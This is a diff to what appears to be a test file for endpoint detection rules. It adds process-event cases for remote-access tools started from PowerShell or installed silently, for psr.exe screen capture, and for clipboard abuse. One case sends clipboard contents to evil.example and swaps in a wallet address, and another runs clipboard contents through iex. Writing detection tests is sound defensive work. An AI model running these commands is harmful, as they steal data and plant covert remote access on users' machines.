@@ -1799,6 +1799,83 @@ CASES = [
             command_line="powershell -c Get-Process",
         ),
     ),
+    # --- RMM/remote-access tool launched from a non-Explorer parent (SYS-155) ---
+    (
+        "SYS-155",
+        True,
+        event(
+            1,
+            parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            image=r"C:\Users\bob\AppData\Local\Temp\AnyDesk.exe",
+            command_line=r"AnyDesk.exe",
+        ),
+    ),
+    (
+        "SYS-155",
+        False,
+        event(
+            1,
+            parent_image=r"C:\Windows\explorer.exe",
+            image=r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
+            command_line=r"AnyDesk.exe",
+        ),
+    ),
+    # --- RMM/remote-access tool installed with a silent flag (SYS-156) ---
+    (
+        "SYS-156",
+        True,
+        event(
+            1,
+            image=r"C:\Users\bob\Downloads\AnyDesk.exe",
+            command_line="AnyDesk.exe --install --silent --start-with-win",
+        ),
+    ),
+    (
+        "SYS-156",
+        False,
+        event(
+            1,
+            image=r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
+            command_line="TeamViewer.exe",
+        ),
+    ),
+    # --- PowerShell reads and overwrites the clipboard (SYS-157) ---
+    (
+        "SYS-157",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                'powershell -c "$c=Get-Clipboard; Set-Clipboard -Value $wallet; '
+                'Invoke-WebRequest -Uri http://evil.example/x -Body $c"'
+            ),
+        ),
+    ),
+    (
+        "SYS-157",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line='powershell -c "iex (Get-Clipboard | Out-String)"',
+        ),
+    ),
+    # --- psr.exe abused for silent screen capture (SYS-158) ---
+    (
+        "SYS-158",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\psr.exe",
+            command_line=r"psr.exe /start /gui 0 /output C:\Users\bob\AppData\Local\Temp\out.zip",
+        ),
+    ),
+    (
+        "SYS-158",
+        False,
+        event(1, image=r"C:\Windows\System32\psr.exe", command_line="psr.exe /stop"),
+    ),
 ]
 
 
